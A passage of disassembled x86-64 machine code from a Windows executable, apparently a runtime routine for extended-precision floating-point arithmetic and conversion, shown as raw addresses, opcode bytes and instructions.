   14000fc99:	44 8d 0c 08          	lea    (%rax,%rcx,1),%r9d
   14000fc9d:	66 89 5d 97          	mov    %bx,-0x69(%rbp)
   14000fca1:	66 41 3b c5          	cmp    %r13w,%ax
   14000fca5:	0f 83 7d 02 00 00    	jae    0x14000ff28
   14000fcab:	66 41 3b cd          	cmp    %r13w,%cx
   14000fcaf:	0f 83 73 02 00 00    	jae    0x14000ff28
   14000fcb5:	41 bd fd bf 00 00    	mov    $0xbffd,%r13d
   14000fcbb:	66 45 3b cd          	cmp    %r13w,%r9w
   14000fcbf:	0f 87 5d 02 00 00    	ja     0x14000ff22
   14000fcc5:	bb bf 3f 00 00       	mov    $0x3fbf,%ebx
   14000fcca:	66 44 3b cb          	cmp    %bx,%r9w
   14000fcce:	77 13                	ja     0x14000fce3
   14000fcd0:	48 c7 45 eb 00 00 00 	movq   $0x0,-0x15(%rbp)
   14000fcd7:	00 
   14000fcd8:	41 bd ff 7f 00 00    	mov    $0x7fff,%r13d
   14000fcde:	e9 59 02 00 00       	jmp    0x14000ff3c
   14000fce3:	66 85 c0             	test   %ax,%ax
   14000fce6:	75 22                	jne    0x14000fd0a
   14000fce8:	66 45 03 cb          	add    %r11w,%r9w
   14000fcec:	85 7d ef             	test   %edi,-0x11(%rbp)
   14000fcef:	75 19                	jne    0x14000fd0a
   14000fcf1:	45 85 c0             	test   %r8d,%r8d
   14000fcf4:	75 14                	jne    0x14000fd0a
   14000fcf6:	85 d2                	test   %edx,%edx
   14000fcf8:	75 10                	jne    0x14000fd0a
   14000fcfa:	66 44 89 65 f1       	mov    %r12w,-0xf(%rbp)
   14000fcff:	41 bd ff 7f 00 00    	mov    $0x7fff,%r13d
   14000fd05:	e9 3b 02 00 00       	jmp    0x14000ff45
   14000fd0a:	66 85 c9             	test   %cx,%cx
   14000fd0d:	75 14                	jne    0x14000fd23
   14000fd0f:	66 45 03 cb          	add    %r11w,%r9w
   14000fd13:	85 7e 08             	test   %edi,0x8(%rsi)
   14000fd16:	75 0b                	jne    0x14000fd23
   14000fd18:	44 39 66 04          	cmp    %r12d,0x4(%rsi)
   14000fd1c:	75 05                	jne    0x14000fd23
   14000fd1e:	44 39 26             	cmp    %r12d,(%rsi)
   14000fd21:	74 ad                	je     0x14000fcd0
   14000fd23:	41 8b fe             	mov    %r14d,%edi
   14000fd26:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   14000fd2a:	45 33 f6             	xor    %r14d,%r14d
   14000fd2d:	44 8b ef             	mov    %edi,%r13d
   14000fd30:	85 ff                	test   %edi,%edi
   14000fd32:	7e 5f                	jle    0x14000fd93
   14000fd34:	43 8d 04 24          	lea    (%r12,%r12,1),%eax
   14000fd38:	4c 8d 75 e7          	lea    -0x19(%rbp),%r14
   14000fd3c:	41 8b dc             	mov    %r12d,%ebx
   14000fd3f:	48 63 c8             	movslq %eax,%rcx
   14000fd42:	41 23 db             	and    %r11d,%ebx
   14000fd45:	4c 8d 7e 08          	lea    0x8(%rsi),%r15
   14000fd49:	4c 03 f1             	add    %rcx,%r14
   14000fd4c:	33 f6                	xor    %esi,%esi
   14000fd4e:	41 0f b7 07          	movzwl (%r15),%eax
   14000fd52:	41 0f b7 0e          	movzwl (%r14),%ecx
   14000fd56:	44 8b d6             	mov    %esi,%r10d
   14000fd59:	0f af c8             	imul   %eax,%ecx
   14000fd5c:	8b 02                	mov    (%rdx),%eax
   14000fd5e:	44 8d 04 08          	lea    (%rax,%rcx,1),%r8d
   14000fd62:	44 3b c0             	cmp    %eax,%r8d
   14000fd65:	72 05                	jb     0x14000fd6c
   14000fd67:	44 3b c1             	cmp    %ecx,%r8d
   14000fd6a:	73 03                	jae    0x14000fd6f
   14000fd6c:	45 8b d3             	mov    %r11d,%r10d
   14000fd6f:	44 89 02             	mov    %r8d,(%rdx)
   14000fd72:	45 85 d2             	test   %r10d,%r10d
   14000fd75:	74 05                	je     0x14000fd7c
   14000fd77:	66 44 01 5a 04       	add    %r11w,0x4(%rdx)
   14000fd7c:	45 2b eb             	sub    %r11d,%r13d
   14000fd7f:	49 83 c6 02          	add    $0x2,%r14
   14000fd83:	49 83 ef 02          	sub    $0x2,%r15
   14000fd87:	45 85 ed             	test   %r13d,%r13d
   14000fd8a:	7f c2                	jg     0x14000fd4e
   14000fd8c:	48 8b 75 cf          	mov    -0x31(%rbp),%rsi
   14000fd90:	45 33 f6             	xor    %r14d,%r14d
   14000fd93:	41 2b fb             	sub    %r11d,%edi
   14000fd96:	48 83 c2 02          	add    $0x2,%rdx
   14000fd9a:	45 03 e3             	add    %r11d,%r12d
   14000fd9d:	85 ff                	test   %edi,%edi
   14000fd9f:	7f 8c                	jg     0x14000fd2d
   14000fda1:	44 8b 55 df          	mov    -0x21(%rbp),%r10d
   14000fda5:	44 8b 45 d7          	mov    -0x29(%rbp),%r8d
   14000fda9:	b8 02 c0 00 00       	mov    $0xc002,%eax
   14000fdae:	66 44 03 c8          	add    %ax,%r9w
   14000fdb2:	45 33 e4             	xor    %r12d,%r12d
   14000fdb5:	bb ff ff 00 00       	mov    $0xffff,%ebx
   14000fdba:	41 bf 00 00 00 80    	mov    $0x80000000,%r15d
   14000fdc0:	66 45 85 c9          	test   %r9w,%r9w
   14000fdc4:	7e 3c                	jle    0x14000fe02
   14000fdc6:	45 85 d7             	test   %r10d,%r15d
   14000fdc9:	75 31                	jne    0x14000fdfc
   14000fdcb:	8b 7d db             	mov    -0x25(%rbp),%edi
   14000fdce:	41 8b d0             	mov    %r8d,%edx
   14000fdd1:	45 03 d2             	add    %r10d,%r10d
   14000fdd4:	c1 ea 1f             	shr    $0x1f,%edx
   14000fdd7:	45 03 c0             	add    %r8d,%r8d
   14000fdda:	8b cf                	mov    %edi,%ecx
   14000fddc:	c1 e9 1f             	shr    $0x1f,%ecx
   14000fddf:	8d 04 3f             	lea    (%rdi,%rdi,1),%eax
   14000fde2:	66 44 03 cb          	add    %bx,%r9w
   14000fde6:	0b c2                	or     %edx,%eax
   14000fde8:	44 0b d1             	or     %ecx,%r10d
   14000fdeb:	44 89 45 d7          	mov    %r8d,-0x29(%rbp)
   14000fdef:	89 45 db             	mov    %eax,-0x25(%rbp)
   14000fdf2:	44 89 55 df          	mov    %r10d,-0x21(%rbp)
   14000fdf6:	66 45 85 c9          	test   %r9w,%r9w
   14000fdfa:	7f ca                	jg     0x14000fdc6
   14000fdfc:	66 45 85 c9          	test   %r9w,%r9w
   14000fe00:	7f 6d                	jg     0x14000fe6f
   14000fe02:	66 44 03 cb          	add    %bx,%r9w
   14000fe06:	79 67                	jns    0x14000fe6f
   14000fe08:	41 0f b7 c1          	movzwl %r9w,%eax
   14000fe0c:	66 f7 d8             	neg    %ax
   14000fe0f:	0f b7 d0             	movzwl %ax,%edx
   14000fe12:	66 44 03 ca          	add    %dx,%r9w
   14000fe16:	66 44 89 4d a3       	mov    %r9w,-0x5d(%rbp)
   14000fe1b:	44 8b 4d 9b          	mov    -0x65(%rbp),%r9d
   14000fe1f:	44 84 5d d7          	test   %r11b,-0x29(%rbp)
   14000fe23:	74 03                	je     0x14000fe28
   14000fe25:	45 03 cb             	add    %r11d,%r9d
   14000fe28:	8b 7d db             	mov    -0x25(%rbp),%edi
   14000fe2b:	41 8b c2             	mov    %r10d,%eax
   14000fe2e:	41 d1 e8             	shr    $1,%r8d
   14000fe31:	8b cf                	mov    %edi,%ecx
   14000fe33:	c1 e0 1f             	shl    $0x1f,%eax
   14000fe36:	d1 ef                	shr    $1,%edi
   14000fe38:	c1 e1 1f             	shl    $0x1f,%ecx
   14000fe3b:	0b f8                	or     %eax,%edi
   14000fe3d:	41 d1 ea             	shr    $1,%r10d
   14000fe40:	44 0b c1             	or     %ecx,%r8d
   14000fe43:	89 7d db             	mov    %edi,-0x25(%rbp)
   14000fe46:	44 89 45 d7          	mov    %r8d,-0x29(%rbp)
   14000fe4a:	49 2b d3             	sub    %r11,%rdx
   14000fe4d:	75 d0                	jne    0x14000fe1f
   14000fe4f:	45 85 c9             	test   %r9d,%r9d
   14000fe52:	44 0f b7 4d a3       	movzwl -0x5d(%rbp),%r9d
   14000fe57:	44 89 55 df          	mov    %r10d,-0x21(%rbp)
   14000fe5b:	74 12                	je     0x14000fe6f
   14000fe5d:	41 0f b7 c0          	movzwl %r8w,%eax
   14000fe61:	66 41 0b c3          	or     %r11w,%ax
   14000fe65:	66 89 45 d7          	mov    %ax,-0x29(%rbp)
   14000fe69:	44 8b 45 d7          	mov    -0x29(%rbp),%r8d
   14000fe6d:	eb 04                	jmp    0x14000fe73
   14000fe6f:	0f b7 45 d7          	movzwl -0x29(%rbp),%eax
   14000fe73:	b9 00 80 00 00       	mov    $0x8000,%ecx
   14000fe78:	66 3b c1             	cmp    %cx,%ax
   14000fe7b:	77 10                	ja     0x14000fe8d
   14000fe7d:	41 81 e0 ff ff 01 00 	and    $0x1ffff,%r8d
   14000fe84:	41 81 f8 00 80 01 00 	cmp    $0x18000,%r8d
   14000fe8b:	75 48                	jne    0x14000fed5
   14000fe8d:	8b 45 d9             	mov    -0x27(%rbp),%eax
   14000fe90:	83 ca ff             	or     $0xffffffff,%edx
   14000fe93:	3b c2                	cmp    %edx,%eax
   14000fe95:	75 38                	jne    0x14000fecf
   14000fe97:	8b 45 dd             	mov    -0x23(%rbp),%eax
   14000fe9a:	44 89 65 d9          	mov    %r12d,-0x27(%rbp)
   14000fe9e:	3b c2                	cmp    %edx,%eax
   14000fea0:	75 21                	jne    0x14000fec3
   14000fea2:	0f b7 45 e1          	movzwl -0x1f(%rbp),%eax
   14000fea6:	44 89 65 dd          	mov    %r12d,-0x23(%rbp)
   14000feaa:	66 3b c3             	cmp    %bx,%ax
   14000fead:	75 0a                	jne    0x14000feb9
   14000feaf:	66 89 4d e1          	mov    %cx,-0x1f(%rbp)
   14000feb3:	66 45 03 cb          	add    %r11w,%r9w
   14000feb7:	eb 10                	jmp    0x14000fec9
   14000feb9:	66 41 03 c3          	add    %r11w,%ax
   14000febd:	66 89 45 e1          	mov    %ax,-0x1f(%rbp)
   14000fec1:	eb 06                	jmp    0x14000fec9
   14000fec3:	41 03 c3             	add    %r11d,%eax
   14000fec6:	89 45 dd             	mov    %eax,-0x23(%rbp)
   14000fec9:	44 8b 55 df          	mov    -0x21(%rbp),%r10d
   14000fecd:	eb 06                	jmp    0x14000fed5
   14000fecf:	41 03 c3             	add    %r11d,%eax
   14000fed2:	89 45 d9             	mov    %eax,-0x27(%rbp)
   14000fed5:	41 bd ff 7f 00 00    	mov    $0x7fff,%r13d
   14000fedb:	41 be 05 00 00 00    	mov    $0x5,%r14d
   14000fee1:	bf ff ff ff 7f       	mov    $0x7fffffff,%edi
   14000fee6:	66 45 3b cd          	cmp    %r13w,%r9w
   14000feea:	72 0d                	jb     0x14000fef9
   14000feec:	0f b7 45 97          	movzwl -0x69(%rbp),%eax
   14000fef0:	44 8b 55 af          	mov    -0x51(%rbp),%r10d
   14000fef4:	66 f7 d8             	neg    %ax
   14000fef7:	eb 32                	jmp    0x14000ff2b
   14000fef9:	0f b7 45 d9          	movzwl -0x27(%rbp),%eax
   14000fefd:	66 44 0b 4d 97       	or     -0x69(%rbp),%r9w
   14000ff02:	44 89 55 ed          	mov    %r10d,-0x13(%rbp)
   14000ff06:	44 8b 55 af          	mov    -0x51(%rbp),%r10d
   14000ff0a:	66 89 45 e7          	mov    %ax,-0x19(%rbp)
   14000ff0e:	8b 45 db             	mov    -0x25(%rbp),%eax
   14000ff11:	89 45 e9             	mov    %eax,-0x17(%rbp)
   14000ff14:	44 8b 45 eb          	mov    -0x15(%rbp),%r8d
   14000ff18:	8b 55 e7             	mov    -0x19(%rbp),%edx
   14000ff1b:	66 44 89 4d f1       	mov    %r9w,-0xf(%rbp)
   14000ff20:	eb 23                	jmp    0x14000ff45
   14000ff22:	41 bd ff 7f 00 00    	mov    $0x7fff,%r13d
   14000ff28:	66 f7 db             	neg    %bx
   14000ff2b:	1b c0                	sbb    %eax,%eax
   14000ff2d:	44 89 65 eb          	mov    %r12d,-0x15(%rbp)
   14000ff31:	41 23 c7             	and    %r15d,%eax
   14000ff34:	05 00 80 ff 7f       	add    $0x7fff8000,%eax
   14000ff39:	89 45 ef             	mov    %eax,-0x11(%rbp)
   14000ff3c:	41 8b d4             	mov    %r12d,%edx
   14000ff3f:	45 8b c4             	mov    %r12d,%r8d
   14000ff42:	89 55 e7             	mov    %edx,-0x19(%rbp)
   14000ff45:	4c 8b 4d a7          	mov    -0x59(%rbp),%r9
   14000ff49:	45 85 d2             	test   %r10d,%r10d
   14000ff4c:	0f 85 c2 fc ff ff    	jne    0x14000fc14
   14000ff52:	48 8b 5d bf          	mov    -0x41(%rbp),%rbx
   14000ff56:	8b 4d 9f             	mov    -0x61(%rbp),%ecx
   14000ff59:	be fd bf 00 00       	mov    $0xbffd,%esi
   14000ff5e:	eb 07                	jmp    0x14000ff67
   14000ff60:	44 8b 45 eb          	mov    -0x15(%rbp),%r8d
   14000ff64:	8b 55 e7             	mov    -0x19(%rbp),%edx
   14000ff67:	8b 45 ef             	mov    -0x11(%rbp),%eax
   14000ff6a:	41 b9 ff 3f 00 00    	mov    $0x3fff,%r9d
   14000ff70:	c1 e8 10             	shr    $0x10,%eax
   14000ff73:	66 41 3b c1          	cmp    %r9w,%ax
   14000ff77:	0f 82 b6 02 00 00    	jb     0x140010233
   14000ff7d:	66 41 03 cb          	add    %r11w,%cx
   14000ff81:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   14000ff87:	44 89 65 9b          	mov    %r12d,-0x65(%rbp)
   14000ff8b:	45 8d 51 ff          	lea    -0x1(%r9),%r10d
   14000ff8f:	89 4d 9f             	mov    %ecx,-0x61(%rbp)
   14000ff92:	0f b7 4d 01          	movzwl 0x1(%rbp),%ecx
   14000ff96:	44 0f b7 e9          	movzwl %cx,%r13d
   14000ff9a:	66 41 23 ca          	and    %r10w,%cx
   14000ff9e:	48 c7 45 d7 00 00 00 	movq   $0x0,-0x29(%rbp)
   14000ffa5:	00 
   14000ffa6:	66 44 33 e8          	xor    %ax,%r13w
   14000ffaa:	66 41 23 c2          	and    %r10w,%ax
   14000ffae:	44 89 65 df          	mov    %r12d,-0x21(%rbp)
   14000ffb2:	66 45 23 e9          	and    %r9w,%r13w
   14000ffb6:	44 8d 0c 08          	lea    (%rax,%rcx,1),%r9d
   14000ffba:	66 41 3b c2          	cmp    %r10w,%ax
   14000ffbe:	0f 83 58 02 00 00    	jae    0x14001021c
   14000ffc4:	66 41 3b ca          	cmp    %r10w,%cx
   14000ffc8:	0f 83 4e 02 00 00    	jae    0x14001021c
   14000ffce:	66 44 3b ce          	cmp    %si,%r9w
   14000ffd2:	0f 87 44 02 00 00    	ja     0x14001021c
   14000ffd8:	41 ba bf 3f 00 00    	mov    $0x3fbf,%r10d
   14000ffde:	66 45 3b ca          	cmp    %r10w,%r9w
   14000ffe2:	77 09                	ja     0x14000ffed
   14000ffe4:	44 89 65 ef          	mov    %r12d,-0x11(%rbp)
   14000ffe8:	e9 40 02 00 00       	jmp    0x14001022d
   14000ffed:	66 85 c0             	test   %ax,%ax
   14000fff0:	75 1c                	jne    0x14001000e
   14000fff2:	66 45 03 cb          	add    %r11w,%r9w
   14000fff6:	85 7d ef             	test   %edi,-0x11(%rbp)
   14000fff9:	75 13                	jne    0x14001000e
   14000fffb:	45 85 c0             	test   %r8d,%r8d
   14000fffe:	75 0e                	jne    0x14001000e
   140010000:	85 d2                	test   %edx,%edx
   140010002:	75 0a                	jne    0x14001000e
   140010004:	66 44 89 65 f1       	mov    %r12w,-0xf(%rbp)
   140010009:	e9 25 02 00 00       	jmp    0x140010233
   14001000e:	66 85 c9             	test   %cx,%cx
   140010011:	75 15                	jne    0x140010028
   140010013:	66 45 03 cb          	add    %r11w,%r9w
   140010017:	85 7d ff             	test   %edi,-0x1(%rbp)
   14001001a:	75 0c                	jne    0x140010028
   14001001c:	44 39 65 fb          	cmp    %r12d,-0x5(%rbp)
   140010020:	75 06                	jne    0x140010028
   140010022:	44 39 65 f7          	cmp    %r12d,-0x9(%rbp)
   140010026:	74 bc                	je     0x14000ffe4
   140010028:	41 8b fc             	mov    %r12d,%edi
   14001002b:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   14001002f:	41 8b f6             	mov    %r14d,%esi
   140010032:	45 85 f6             	test   %r14d,%r14d
   140010035:	7e 5d                	jle    0x140010094
   140010037:	8d 04 3f             	lea    (%rdi,%rdi,1),%eax
   14001003a:	4c 8d 7d e7          	lea    -0x19(%rbp),%r15
   14001003e:	44 8b e7             	mov    %edi,%r12d
   140010041:	48 63 c8             	movslq %eax,%rcx
   140010044:	45 23 e3             	and    %r11d,%r12d
   140010047:	4c 8d 75 ff          	lea    -0x1(%rbp),%r14
   14001004b:	4c 03 f9             	add    %rcx,%r15
   14001004e:	33 db                	xor    %ebx,%ebx
   140010050:	41 0f b7 07          	movzwl (%r15),%eax
   140010054:	41 0f b7 0e          	movzwl (%r14),%ecx
   140010058:	44 8b c3             	mov    %ebx,%r8d
   14001005b:	0f af c8             	imul   %eax,%ecx
   14001005e:	8b 02                	mov    (%rdx),%eax
   140010060:	44 8d 14 08          	lea    (%rax,%rcx,1),%r10d
   140010064:	44 3b d0             	cmp    %eax,%r10d
   140010067:	72 05                	jb     0x14001006e
   140010069:	44 3b d1             	cmp    %ecx,%r10d
   14001006c:	73 03                	jae    0x140010071
   14001006e:	45 8b c3             	mov    %r11d,%r8d
   140010071:	44 89 12             	mov    %r10d,(%rdx)
   140010074:	45 85 c0             	test   %r8d,%r8d
   140010077:	74 05                	je     0x14001007e
   140010079:	66 44 01 5a 04       	add    %r11w,0x4(%rdx)
   14001007e:	41 2b f3             	sub    %r11d,%esi
   140010081:	49 83 c7 02          	add    $0x2,%r15
   140010085:	49 83 ee 02          	sub    $0x2,%r14
   140010089:	85 f6                	test   %esi,%esi
   14001008b:	7f c3                	jg     0x140010050
   14001008d:	44 8b 75 b7          	mov    -0x49(%rbp),%r14d
   140010091:	45 33 e4             	xor    %r12d,%r12d
   140010094:	45 2b f3             	sub    %r11d,%r14d
   140010097:	48 83 c2 02          	add    $0x2,%rdx
   14001009b:	41 03 fb             	add    %r11d,%edi
   14001009e:	44 89 75 b7          	mov    %r14d,-0x49(%rbp)
   1400100a2:	45 85 f6             	test   %r14d,%r14d
   1400100a5:	7f 88                	jg     0x14001002f
   1400100a7:	48 8b 5d bf          	mov    -0x41(%rbp),%rbx
   1400100ab:	44 8b 45 df          	mov    -0x21(%rbp),%r8d
   1400100af:	44 8b 55 d7          	mov    -0x29(%rbp),%r10d
   1400100b3:	b8 02 c0 00 00       	mov    $0xc002,%eax
   1400100b8:	be 00 00 00 80       	mov    $0x80000000,%esi
   1400100bd:	41 be ff ff 00 00    	mov    $0xffff,%r14d
   1400100c3:	66 44 03 c8          	add    %ax,%r9w
   1400100c7:	66 45 85 c9          	test   %r9w,%r9w
   1400100cb:	7e 3c                	jle    0x140010109
   1400100cd:	44 85 c6             	test   %r8d,%esi
   1400100d0:	75 31                	jne    0x140010103
   1400100d2:	8b 7d db             	mov    -0x25(%rbp),%edi
   1400100d5:	41 8b d2             	mov    %r10d,%edx
   1400100d8:	45 03 c0             	add    %r8d,%r8d
   1400100db:	c1 ea 1f             	shr    $0x1f,%edx
   1400100de:	45 03 d2             	add    %r10d,%r10d
   1400100e1:	8b cf                	mov    %edi,%ecx
   1400100e3:	c1 e9 1f             	shr    $0x1f,%ecx
   1400100e6:	8d 04 3f             	lea    (%rdi,%rdi,1),%eax
   1400100e9:	66 45 03 ce          	add    %r14w,%r9w
   1400100ed:	0b c2                	or     %edx,%eax
   1400100ef:	44 0b c1             	or     %ecx,%r8d
   1400100f2:	44 89 55 d7          	mov    %r10d,-0x29(%rbp)
   1400100f6:	89 45 db             	mov    %eax,-0x25(%rbp)
   1400100f9:	44 89 45 df          	mov    %r8d,-0x21(%rbp)
   1400100fd:	66 45 85 c9          	test   %r9w,%r9w
   140010101:	7f ca                	jg     0x1400100cd
   140010103:	66 45 85 c9          	test   %r9w,%r9w
   140010107:	7f 65                	jg     0x14001016e
   140010109:	66 45 03 ce          	add    %r14w,%r9w
   14001010d:	79 5f                	jns    0x14001016e
   14001010f:	8b 5d 9b             	mov    -0x65(%rbp),%ebx
   140010112:	41 0f b7 c1          	movzwl %r9w,%eax
   140010116:	66 f7 d8             	neg    %ax
   140010119:	0f b7 d0             	movzwl %ax,%edx
   14001011c:	66 44 03 ca          	add    %dx,%r9w
   140010120:	44 84 5d d7          	test   %r11b,-0x29(%rbp)
   140010124:	74 03                	je     0x140010129
   140010126:	41 03 db             	add    %r11d,%ebx
   140010129:	8b 7d db             	mov    -0x25(%rbp),%edi
   14001012c:	41 8b c0             	mov    %r8d,%eax
   14001012f:	41 d1 ea             	shr    $1,%r10d
   140010132:	8b cf                	mov    %edi,%ecx
   140010134:	c1 e0 1f             	shl    $0x1f,%eax
   140010137:	d1 ef                	shr    $1,%edi
   140010139:	c1 e1 1f             	shl    $0x1f,%ecx
   14001013c:	0b f8                	or     %eax,%edi
   14001013e:	41 d1 e8             	shr    $1,%r8d
   140010141:	44 0b d1             	or     %ecx,%r10d
   140010144:	89 7d db             	mov    %edi,-0x25(%rbp)
   140010147:	44 89 55 d7          	mov    %r10d,-0x29(%rbp)
   14001014b:	49 2b d3             	sub    %r11,%rdx
   14001014e:	75 d0                	jne    0x140010120
   140010150:	85 db                	test   %ebx,%ebx
   140010152:	48 8b 5d bf          	mov    -0x41(%rbp),%rbx
   140010156:	44 89 45 df          	mov    %r8d,-0x21(%rbp)
   14001015a:	74 12                	je     0x14001016e
   14001015c:	41 0f b7 c2          	movzwl %r10w,%eax
   140010160:	66 41 0b c3          	or     %r11w,%ax
   140010164:	66 89 45 d7          	mov    %ax,-0x29(%rbp)
   140010168:	44 8b 55 d7          	mov    -0x29(%rbp),%r10d
   14001016c:	eb 04                	jmp    0x140010172
   14001016e:	0f b7 45 d7          	movzwl -0x29(%rbp),%eax
   140010172:	b9 00 80 00 00       	mov    $0x8000,%ecx
   140010177:	66 3b c1             	cmp    %cx,%ax
   14001017a:	77 10                	ja     0x14001018c
   14001017c:	41 81 e2 ff ff 01 00 	and    $0x1ffff,%r10d
   140010183:	41 81 fa 00 80 01 00 	cmp    $0x18000,%r10d
   14001018a:	75 49                	jne    0x1400101d5
   14001018c:	8b 45 d9             	mov    -0x27(%rbp),%eax
   14001018f:	83 ca ff             	or     $0xffffffff,%edx
   140010192:	3b c2                	cmp    %edx,%eax
   140010194:	75 39                	jne    0x1400101cf
   140010196:	8b 45 dd             	mov    -0x23(%rbp),%eax
   140010199:	44 89 65 d9          	mov    %r12d,-0x27(%rbp)
   14001019d:	3b c2                	cmp    %edx,%eax
   14001019f:	75 22                	jne    0x1400101c3
   1400101a1:	0f b7 45 e1          	movzwl -0x1f(%rbp),%eax
   1400101a5:	44 89 65 dd          	mov    %r12d,-0x23(%rbp)
   1400101a9:	66 41 3b c6          	cmp    %r14w,%ax
   1400101ad:	75 0a                	jne    0x1400101b9
   1400101af:	66 89 4d e1          	mov    %cx,-0x1f(%rbp)
   1400101b3:	66 45 03 cb          	add    %r11w,%r9w
   1400101b7:	eb 10                	jmp    0x1400101c9
   1400101b9:	66 41 03 c3          	add    %r11w,%ax
   1400101bd:	66 89 45 e1          	mov    %ax,-0x1f(%rbp)
   1400101c1:	eb 06                	jmp    0x1400101c9
   1400101c3:	41 03 c3             	add    %r11d,%eax
   1400101c6:	89 45 dd             	mov    %eax,-0x23(%rbp)
   1400101c9:	44 8b 45 df          	mov    -0x21(%rbp),%r8d
   1400101cd:	eb 06                	jmp    0x1400101d5
   1400101cf:	41 03 c3             	add    %r11d,%eax
   1400101d2:	89 45 d9             	mov    %eax,-0x27(%rbp)
   1400101d5:	b8 ff 7f 00 00       	mov    $0x7fff,%eax
   1400101da:	66 44 3b c8          	cmp    %ax,%r9w
   1400101de:	72 18                	jb     0x1400101f8
   1400101e0:	66 41 f7 dd          	neg    %r13w
   1400101e4:	45 8b c4             	mov    %r12d,%r8d
   1400101e7:	41 8b d4             	mov    %r12d,%edx
   1400101ea:	1b c0                	sbb    %eax,%eax
   1400101ec:	23 c6                	and    %esi,%eax
   1400101ee:	05 00 80 ff 7f       	add    $0x7fff8000,%eax
   1400101f3:	89 45 ef             	mov    %eax,-0x11(%rbp)
   1400101f6:	eb 40                	jmp    0x140010238
   1400101f8:	0f b7 45 d9          	movzwl -0x27(%rbp),%eax
   1400101fc:	66 45 0b cd          	or     %r13w,%r9w
   140010200:	44 89 45 ed          	mov    %r8d,-0x13(%rbp)
   140010204:	66 89 45 e7          	mov    %ax,-0x19(%rbp)
   140010208:	8b 45 db             	mov    -0x25(%rbp),%eax
   14001020b:	66 44 89 4d f1       	mov    %r9w,-0xf(%rbp)
   140010210:	89 45 e9             	mov    %eax,-0x17(%rbp)
   140010213:	44 8b 45 eb          	mov    -0x15(%rbp),%r8d
   140010217:	8b 55 e7             	mov    -0x19(%rbp),%edx
   14001021a:	eb 1c                	jmp    0x140010238
   14001021c:	66 41 f7 dd          	neg    %r13w
   140010220:	1b c0                	sbb    %eax,%eax
   140010222:	41 23 c7             	and    %r15d,%eax
   140010225:	05 00 80 ff 7f       	add    $0x7fff8000,%eax
   14001022a:	89 45 ef             	mov    %eax,-0x11(%rbp)
   14001022d:	41 8b d4             	mov    %r12d,%edx
   140010230:	45 8b c4             	mov    %r12d,%r8d
   140010233:	b9 00 80 00 00       	mov    $0x8000,%ecx
   140010238:	8b 45 9f             	mov    -0x61(%rbp),%eax
   14001023b:	44 8b 75 b3          	mov    -0x4d(%rbp),%r14d
   14001023f:	66 89 03             	mov    %ax,(%rbx)
   140010242:	44 84 5d c7          	test   %r11b,-0x39(%rbp)
   140010246:	74 1d                	je     0x140010265
   140010248:	98                   	cwtl
   140010249:	44 03 f0             	add    %eax,%r14d
   14001024c:	45 85 f6             	test   %r14d,%r14d
   14001024f:	7f 14                	jg     0x140010265
   140010251:	66 39 4d 99          	cmp    %cx,-0x67(%rbp)
   140010255:	b8 20 00 00 00       	mov    $0x20,%eax
   14001025a:	8d 48 0d             	lea    0xd(%rax),%ecx
   14001025d:	0f 44 c1             	cmove  %ecx,%eax
   140010260:	e9 3c f8 ff ff       	jmp    0x14000faa1
   140010265:	44 8b 4d ef          	mov    -0x11(%rbp),%r9d
   140010269:	b8 15 00 00 00       	mov    $0x15,%eax
   14001026e:	66 44 89 65 f1       	mov    %r12w,-0xf(%rbp)
   140010273:	8b 75 ef             	mov    -0x11(%rbp),%esi
   140010276:	44 3b f0             	cmp    %eax,%r14d
   140010279:	44 8d 50 f3          	lea    -0xd(%rax),%r10d
   14001027d:	44 0f 4f f0          	cmovg  %eax,%r14d
   140010281:	41 c1 e9 10          	shr    $0x10,%r9d
   140010285:	41 81 e9 fe 3f 00 00 	sub    $0x3ffe,%r9d
   14001028c:	41 8b c8             	mov    %r8d,%ecx
   14001028f:	8b c2                	mov    %edx,%eax
   140010291:	03 f6                	add    %esi,%esi
   140010293:	45 03 c0             	add    %r8d,%r8d
   140010296:	c1 e8 1f             	shr    $0x1f,%eax
   140010299:	c1 e9 1f             	shr    $0x1f,%ecx
   14001029c:	44 0b c0             	or     %eax,%r8d
   14001029f:	0b f1                	or     %ecx,%esi
   1400102a1:	03 d2                	add    %edx,%edx
   1400102a3:	4d 2b d3             	sub    %r11,%r10
   1400102a6:	75 e4                	jne    0x14001028c
   1400102a8:	44 89 45 eb          	mov    %r8d,-0x15(%rbp)
   1400102ac:	89 55 e7             	mov    %edx,-0x19(%rbp)
   1400102af:	45 85 c9             	test   %r9d,%r9d
   1400102b2:	79 32                	jns    0x1400102e6
   1400102b4:	41 f7 d9             	neg    %r9d
   1400102b7:	45 0f b6 d1          	movzbl %r9b,%r10d
   1400102bb:	45 85 d2             	test   %r10d,%r10d
   1400102be:	7e 26                	jle    0x1400102e6
   1400102c0:	41 8b c8             	mov    %r8d,%ecx
   1400102c3:	8b c6                	mov    %esi,%eax
   1400102c5:	d1 ea                	shr    $1,%edx
   1400102c7:	41 d1 e8             	shr    $1,%r8d
   1400102ca:	c1 e0 1f             	shl    $0x1f,%eax
   1400102cd:	c1 e1 1f             	shl    $0x1f,%ecx
   1400102d0:	45 2b d3             	sub    %r11d,%r10d
   1400102d3:	d1 ee                	shr    $1,%esi
   1400102d5:	44 0b c0             	or     %eax,%r8d
   1400102d8:	0b d1                	or     %ecx,%edx
   1400102da:	45 85 d2             	test   %r10d,%r10d
   1400102dd:	7f e1                	jg     0x1400102c0
   1400102df:	44 89 45 eb          	mov    %r8d,-0x15(%rbp)
   1400102e3:	89 55 e7             	mov    %edx,-0x19(%rbp)
   1400102e6:	45 8d 7e 01          	lea    0x1(%r14),%r15d
   1400102ea:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   1400102ee:	4c 8b d7             	mov    %rdi,%r10
   1400102f1:	45 85 ff             	test   %r15d,%r15d
   1400102f4:	0f 8e d4 00 00 00    	jle    0x1400103ce
   1400102fa:	f2 0f 10 45 e7       	movsd  -0x19(%rbp),%xmm0
   1400102ff:	41 8b c8             	mov    %r8d,%ecx
   140010302:	45 03 c0             	add    %r8d,%r8d
   140010305:	c1 e9 1f             	shr    $0x1f,%ecx
   140010308:	8b c2                	mov    %edx,%eax
   14001030a:	03 d2                	add    %edx,%edx
   14001030c:	c1 e8 1f             	shr    $0x1f,%eax
   14001030f:	44 8d 0c 36          	lea    (%rsi,%rsi,1),%r9d
   140010313:	f2 0f 11 45 07       	movsd  %xmm0,0x7(%rbp)
   140010318:	44 0b c0             	or     %eax,%r8d
   14001031b:	44 0b c9             	or     %ecx,%r9d
